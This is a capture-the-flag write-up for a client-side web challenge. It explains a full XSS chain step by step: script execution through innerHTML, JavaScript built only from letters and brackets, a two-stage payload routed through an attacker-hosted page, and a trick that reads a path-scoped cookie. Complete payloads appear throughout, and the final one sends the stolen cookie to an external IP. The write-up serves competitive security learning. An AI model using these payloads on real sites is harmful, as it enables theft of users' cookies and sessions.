---
title: "Lost One's Weeping: Ignite Hackathon 2026 Pre-Quals"
description: "A client-side XSS chain through restricted HTML, a URL-validating bot, and a path-scoped flag cookie in Ignite's 2026 Pre-Quals."
date: 2026-11-17
tags: [web, appsec, ctf, xss]
---

Writeup for **Lost One's Weeping**, a web challenge from **Ignite's National Cyber Security Hackathon 2026 Pre-Quals**.

This is a hard web client side ctf challenge with the ultimate goal to ofcourse exfiltrate the flag. We can start by looking at where the flag is stored:

## Flag storage and bot behavior

The flag is stored in `bot/conf.js`:

```js
    context = await browser.createBrowserContext();

    await context.setCookie({
      name: "FLAG",
      value: flag,
      domain: challenge.appUrl.hostname,
      path: "/flag/in/cookie",
    });
```

Since this is a client side ctf challenge which can be deduced by the presence of a bot. We can see from the snippet above that the flag is in the bot's cookie and another thing to note is that its path is set to `/flag/in/cookie` which is weird and uncommon for typical xss ctf challenges but it will make sense in a bit. Alright so our goal is to steal the bot's cookie.

This is the whole bot's flow:

```js
    context = await browser.createBrowserContext();

    await context.setCookie({
      name: "FLAG",
      value: flag,
      domain: challenge.appUrl.hostname,
      path: "/flag/in/cookie",
    });

    const page = await context.newPage();

    await page.goto(url, {
      timeout: 3_000,
      waitUntil: "domcontentloaded",
    });

    await sleep(5_000);
    await page.close();
  } finally {
    if (context !== undefined) {
      await context.close();
    }
```

The bot first creates a browser context so that it can browse and visit urls and open pages, it then sets the cookie (which is our flag or rather I'd say our ultimate goal). Then it creates a new page and then goes to a url and sleeps for 5 seconds and then close the page. This snippet is part of the function `visit()` which is imported and used in `bot/index.js` like this:

```js
app.post("/api/report", async (req, res) => {
  const validatedUrl = validateUrl(req.body?.url);

  if (validatedUrl === null) {
    return res.status(400).type("text/plain").send("Invalid url");
  }

  try {
    await visit(validatedUrl);
    return res.sendStatus(200);
  } catch (error) {
    console.error(error);
    return res.status(500).type("text/plain").send("Something went wrong");
  }
});
```

So it will take a url from us as the input and validates(?) it and then calls the visit function which as we saw earlier, the bot will then navigate to that url with the flag cookie set on that path. We will come back to the validate function later because that's what made the whole challenge much much harder than I anticipated.

## CSP and input filtering

Now let's take a look at the web container which will be our entrypoint in `web/index.js`, the key part of the code is just this:

```js
app.get("/", (req, res) => {
  const html = typeof req.query.html === "string" ? req.query.html : "";

  res.set(
    "Content-Security-Policy",
    [
      "default-src 'none'",
      "script-src 'unsafe-eval' 'unsafe-inline'",
    ].join("; ")
  );

  if (!/^[a-z<>()]*$/.test(html)) {
    return res
      .status(400)
      .type("text/plain")
      .send("invalid characters :(");
  }

  res.type("html").send(`<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Lost One's Weeping</title>
</head>
<body>
  <h1>Lost One's Weeping</h1>
  <pre>?html=...</pre>
  <div id="output"></div>
  <script>
    const html = ${JSON.stringify(html)};
    document.getElementById("output").innerHTML = html;
  </script>
</body>
</html>`);
});
```

The source code is really simple, it takes a parameter via GET param `?html=` and renders it via innerHTML but with a CSP and some regex matching, let's disect it step by step. First, the CSP:

```js
 res.set(
    "Content-Security-Policy",
    [
      "default-src 'none'",
      "script-src 'unsafe-eval' 'unsafe-inline'",
    ].join("; ")
  );
```

The CSP is very strict except that it allows inline script tags and eval so payloads like `<img src=x onerror=alert()>`, `<script>alert()</script>` or `<svg onload=alert()>` should work and should give you XSS/JS execution but it isn't hard for no reason. Then comes the regex:

```js
if (!/^[a-z<>()]*$/.test(html)) {
    return res
      .status(400)
      .type("text/plain")
      .send("invalid characters :(");
  }
```

The regex simply checks if our html input contains only lowercase alphabets (a-z), angular brackets (<>) and parenthesis (), no space, no numbers, no special characters and no uppercase letters, so payloads like `<img src=x onerror=alert()>` will straight up be rejected by the server due to input being not matched to the regex so the only option that we have available is using script tag like this:

```
<script>alert()</script>
```

## Script execution through innerHTML

But, our input is being rendered via innerHTML so script tag shouldn't work, read more about innerHTML [here](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) which in the security considerations, says:

```
[...] While the property does prevent <script> elements from executing when they are injected, it is susceptible to many other ways that attackers can craft HTML to run malicious JavaScript. [...]
```

So this seems like a dead-end but it isn't. If anyone who's really active in the ctf community knows about the impossible XSS labs by PortSwigger in which one of the labs was about this exact same scenario, get XSS using script tag with your input being rendered via innerHTML so no img, svg or any other tags and in July, a really well-known security researcher, [Masato Kinugawa](https://x.com/kinugawamasato), in the community solved the Impossible lab.

His tweet: https://x.com/kinugawamasato/status/2074446473220214979 <br>
The public Github Issue: https://github.com/PortSwigger/xss-cheatsheet-data/issues/117

Basically the payload is this:

```html
<select><button><selectedcontent><button><option><svg><script>alert()
```

But running this on the challenge on your own local browser won't work, at least in the latest version and since the bot used an older version of chromium, it was necessary to reproduce it on the version the bot was using instead of just concluding that the payload isn't working. For testing it in the bot's browser, I added the following line inside the bot's visit function:

```js
// ======= DEBUG ================
page.on('console', msg => {
  console.log(`[${msg.type()}] ${msg.text()}`);
});
// ===============================
```

It will intercept any console events from the browser and log it in the terminal so now all we have to do was just send the url to the bot with our payload like this:

```js
<select><button><selectedcontent><button><option><svg><script>console.log(1337)
```

## JavaScript within the character allowlist

But, this won't work......
Remember the regex from earlier? It doesn't allow any special characters and numbers so even a simple `.` isn't allowed which makes it hard to execute javascript and call functions of our choice but it's still possible to execute your own javascript code of your choice even under this limitation (thanks JavaScript). It's possible because of `with(...)` statements in JS, [source](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with).

So reading up more on this, we can now do something like this:

```js
with(console)log(1337)
```

Try running this in a JS repl or in your browser console and you'll see 1337 logged in your console.

So our payload becomes this:

```html
<select><button><selectedcontent><button><option><svg><script>with(console)log(document)
```

Here I chose document because remember, numbers are banned as well :-)

Making the url and sending the bot to visit it and shortly in 2-3 seconds, we will see something like this in our console where the challenge is running via docker:

```
bot-1    | [log] [node HTMLDocument]
bot-1    | [log] [node HTMLDocument]
```

So we can now execute our own JavaScript code and get XSS, it should be simple now, no? Now comes the main part, build such a JS code that stays under the regex allowlist and execute our own JS code.

Now this challenge became kinda like a typical jail ctf challenge where our goal is to execute our malicious code staying within the restrictions or bypassing them. I've had a fair share of solving such jail challenges in Python, JavaScript, Java and I've even wrote code to execute Javascript using only 6 letters (no it's not JSF**k) and that even manually so I already had a bunch of really cool ideas on how to quickly solve it. The first idea was to create a code to do this:

```js
eval(location.hash.slice(1))
```

Have our XSS payload in the URL's hash fragment and do something like this:

```js
with(location)with(hash)eval(slice(1))
```

Running this in our own browser works, ofcourse the digit is blocked but we can bypass that very easily, but here comes the part where the bot validates our URL, remember?

## Working around URL validation

The bot does this to exactly prevent such easy solutions like this, so all the ideas that I had like storing our payload in the URL fragment or somewhere in the URL's hostname (like in the username:password section) or even in another GET parameter, it all went to vain....

So now, do we really need to form a really long JavaScript expression in this limitation? Not really. We can make the bot open our malicious attacker page which then again open the bot with our payload to execute the JavaScript code from the URL's hash fragment like this:

```js
with(window)open("http://attacker.com")
```

And then on attacker.com:

```html
<script>
    open("http://proxy:3000/?html=with(location)with(hash)eval(slice(1))#XSS")
</script>
```

Now this should work and will make the bot execute whatever code we put in place of `XSS`. But now we have to write the "http:///attacker.com" again staying under limitations so since quotation marks are blocked, we have to manually form the strings and there are really, really cool and clever ways to come up with ways to get around this. For example, to get the protocol "http:", we can use `with(location)protocol`, we can then use the `.at()` method to access strings on specific indexes, slashes via `with(location)pathname`.Now I'll talk about how to get numbers in a second but if we take a look at our given problem, coming up with the JavaScript code to write down our whole domain name with port is very, very hard. So I what I did was used ngrok to port forward localhost:8000 and I got this hostname: `0.tcp.in.ngrok.io:23074`

Still, I needed to get rid of the tedious domain name `0.tcp.in.ngrok.io` so what I did was resolved the domain name to IPv4 and then converted it to hex which resulted in this:

```
http://0x36c61be:23074
```

Ok, that makes things much much easier, now if I go over step by step on how I get numbers and letters, it will unnecessarily make the writeup really long but if anyone still has doubts, you can ask me.

Basically you can get length of different names of functions doing like this `function.name.length` so you can do stuff like this:

```
navigator.webdriver -> true (but in JS, true means 1)
fetch.name.length -> 5
console.log.name.length -> 3
atob.name.length -> 4
confirm.name.length -> 7
dirxml.name.length -> 6
scroll.name.length -> 6
html.constructor.name.length -> 6
monitor.constructor.name.length -> 8
unmonitor.name.length -> 9
external.constructor.name.at(navigator.webdriver) -> x
```

Well you can now guess that we can do some really complex stuff as well for example doing something like this to get whatever we want:

```
?html=x<payload>
```

And then

```js
location.href.split('x').length -> 2
```

## Building the second-stage payload

Well, after chaining all this stuff in with statements, I came up with this:

```html
<select><button><selectedcontent><button><option><svg><script>with(navigator)with(location)with(hash)with(split(hash))if(push(protocol))if(push(pathname))if(push(pathname))with(port)if(push(at(webdriver)))with(external)with(constructor)with(name)if(push(at(webdriver)))with(port)if(push(at(closed)))with(scroll)with(name)if(push(length))with(close)with(name)if(push(at(closed)))with(scroll)with(name)if(push(length))with(atob)if(push(length))with(btoa)with(name)if(push(at(closed)))with(escape)with(name)if(push(at(closed)))with(protocol)with(slice(webdriver))with(slice(webdriver))with(slice(webdriver))with(slice(webdriver))if(push(at(closed)))with(protocol)with(slice)if(push(length))with(port)if(push(at(closed)))with(port)if(push(at(webdriver)))with(confirm)with(name)if(push(length))with(open)with(name)if(push(length))open(join(hash))
```

Which will just make the bot open my server's index.html and then, the bot will open the page containing the following html:

```html
<script>
    window.open("http://proxy:3000/?html=%3Cselect%3E%3Cbutton%3E%3Cselectedcontent%3E%3Cbutton%3E%3Coption%3E%3Csvg%3E%3Cscript%3Ewith%28navigator%29with%28location%29with%28hash%29eval%28unescape%28substring%28webdriver%29%29%29#if%28%21window.p%29%7Bwindow.p%3Dopen%28%27%2Fflag%2Fin%2Fcookie%2Fa%27.repeat%282000%29%29%3BsetTimeout%28%28%29%3D%3Elocation%3D%27http%3A%2F%2F3.108.97.190%3A23074%2F%3F%27%2BencodeURIComponent%28window.p.document.cookie%29%2C1000%29%7D")
</script>
```

Which will result in this with our payload being in the hash fragment (#):

```html
<select><button><selectedcontent><button><option><svg><script>with(navigator)with(location)with(hash)eval(unescape(substring(webdriver)))#if(!window.p){window.p=open('/flag/in/cookie/a'.repeat(2000));setTimeout(()=>location='http://3.108.97.190:23074/?' encodeURIComponent(window.p.document.cookie),1000)}
```

## Reading the path-scoped flag cookie

This will get us the flag as this was the final payload but the 3rd part was to figure out a way to get the cookie, remember the path the cookie was being set to? Turns out that you can't read it and it's not as simple as you think. It's because of the nginx config, let's take a look at it:

```c
server {
    listen 3000;
    server_name _;

    if ($request_uri ~* "%2f|%5c") {
        return 444;
    }

    error_page 400 =444 /__drop;
    location = /__drop {
        return 444;
    }

    location = / {
        proxy_pass http://web:3000;
    }

    location / {
        return 444;
    }
}
```

We can see that in all paths, no matter what path you visit like `/test`, `/flag/in/cookie/bb`. Nginx will just close the connection immediately due to which we can't read the flag cookie but thankfully there is another trick to get around it. There is an HTTP response status 413 named "Content Too Large" which will result in an error if the URL or the request data is too large for the server to handle. I know this because of a ctf challenge that I solved back in 2024 from Alpacahack named "Disconnection" and "Disconnection Revenge" where the goal was to do exactly this. You can read the writeup of the 2 challenges [here](https://dimas0305.notion.site/Bypassing-null-Origin-in-4xx-Status-Code-Using-Iframe-disconnection-revenge-Writeup-AlpacaHack-R-14e48583e65d80e6b8d5c53f07905d97).

Basically if we make the server open a really long url, it will just throw a HTTP 413 status response instead of the status 444 and dropping the connection, and since the HTTP status 413 is same origin, we can leak the cookie so all in all, the flow looks like this:

```
Bot executes our window.open xss payload and visits our website
We redirect the bot to execute our second stage XSS payload.
The second stage will do this:

1. w = window.open("/flag/in/cookie".concat("a".repeat(2000)));
2. wait for the window to open via setTimeout
3. access the cookie via w.document.cookie and send it back to our exfil server
```

And that's it, thanks :)